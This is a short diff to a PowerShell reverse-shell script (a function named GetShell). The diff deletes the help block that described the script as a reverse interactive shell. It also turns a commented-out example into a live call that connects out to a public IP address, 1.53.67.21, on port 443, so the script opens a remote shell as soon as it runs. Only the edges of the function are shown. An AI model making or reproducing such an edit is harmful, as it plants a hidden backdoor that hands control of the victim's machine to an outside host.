@@ -1,24 +1,4 @@
 function GetShell(){
-<#
-
-.SYNOPSIS
-This script which can be used for Reverse interactive PowerShell from a target. 
-
-.PARAMETER IPAddress
-The IP address to connect to when using the -Reverse switch.
-
-.PARAMETER Port
-The port to connect to when using the -Reverse switch.
-
-
-.EXAMPLE
-PS > GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646
-
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
-
-#>
-
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
 
         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
@@ -99,4 +79,4 @@ function WriteToStream ($String) {
 }
 
 
-# GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646
+GetShell -Reverse -IPAddress 1.53.67.21 -Port 443
